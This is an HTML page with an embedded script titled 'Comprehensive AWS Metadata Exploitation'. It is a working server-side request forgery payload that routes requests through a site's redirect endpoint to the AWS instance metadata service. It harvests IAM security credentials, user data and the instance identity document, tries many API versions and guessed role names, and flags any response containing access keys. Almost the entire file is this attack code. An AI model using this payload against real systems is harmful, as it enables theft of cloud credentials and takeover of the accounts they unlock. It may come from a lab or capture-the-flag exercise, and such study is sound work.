<html>
    <head>
        <title>Comprehensive AWS Metadata Test</title>
        <style>
            .success { color: green; font-weight: bold; }
            .error { color: red; }
            .test { margin: 10px 0; padding: 5px; border-left: 3px solid #ccc; }
        </style>
    </head>
    <body>
        <h1>Comprehensive AWS Metadata Exploitation</h1>
        <div id="summary"></div>
        <div id="results"></div>
        
        <script>
            var results = document.getElementById("results");
            var summary = document.getElementById("summary");
            var successCount = 0;
            
            function testEndpoint(name, url, headers) {
                var xhr = new XMLHttpRequest();
                try {
                    xhr.open('GET', url, false);
                    if (headers) {
                        for (var header in headers) {
                            xhr.setRequestHeader(header, headers[header]);
                        }
                    }
                    xhr.send();
                    
                    var success = xhr.responseText && xhr.responseText.length > 50 && 
                                 (xhr.responseText.indexOf('AccessKeyId') !== -1 || 
                                  xhr.responseText.indexOf('S3Role') !== -1 ||
                                  xhr.responseText.indexOf('iam') !== -1);
                    
                    if (success) successCount++;
                    
                    results.innerHTML += '<div class="test"><h4>' + name + ' (' + xhr.status + ')</h4>';
                    results.innerHTML += '<pre style="max-height: 200px; overflow-y: auto; ' + 
                                       (success ? 'border: 2px solid green;' : '') + '">' + 
                                       xhr.responseText + '</pre></div>';
                    
                    return xhr.responseText;
                } catch(e) {
                    results.innerHTML += '<div class="test error"><h4>' + name + ' (Error)</h4><pre>' + e.message + '</pre></div>';
                    return null;
                }
            }
            
            summary.innerHTML = "Testing all possible AWS metadata endpoints...";
            
            // Test 1: IMSv1 role listing
            testEndpoint("IMSv1 - Role Listing", "/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/");
            
            // Test 2: IMSv1 direct S3Role
            testEndpoint("IMSv1 - S3Role Direct", "/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role");
            
            // Test 3: Latest API without token
            testEndpoint("Latest API - No Token", "/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role");
            
            // Test 4: Multiple legacy versions
            var versions = ['2007-01-19', '2008-02-01', '2009-04-04', '2011-01-01', '2016-09-02'];
            for (var i = 0; i < versions.length; i++) {
                testEndpoint("Version " + versions[i], "/redir.php?url=http://169.254.169.254/" + versions[i] + "/meta-data/iam/security-credentials/S3Role");
            }
            
            // Test 5: User data (sometimes contains secrets)
            testEndpoint("User Data", "/redir.php?url=http://169.254.169.254/latest/user-data");
            testEndpoint("User Data (v1.0)", "/redir.php?url=http://169.254.169.254/1.0/user-data");
            
            // Test 6: Instance identity document
            testEndpoint("Instance Identity", "/redir.php?url=http://169.254.169.254/latest/dynamic/instance-identity/document");
            
            // Test 7: Try without version specification
            testEndpoint("No Version", "/redir.php?url=http://169.254.169.254/meta-data/iam/security-credentials/S3Role");
            
            // Test 8: Try different role names
            var possibleRoles = ['S3Role', 'EC2Role', 'DefaultRole', 'WebRole', 'AdminRole'];
            for (var j = 0; j < possibleRoles.length; j++) {
                testEndpoint("Role: " + possibleRoles[j], "/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/" + possibleRoles[j]);
            }
            
            // Update summary
            summary.innerHTML = "Testing completed. Found " + successCount + " potentially successful endpoints.";
            if (successCount > 0) {
                summary.innerHTML += '<span class="success"> CHECK THE GREEN-BORDERED RESULTS!</span>';
            }
        </script>
    </body>
</html>
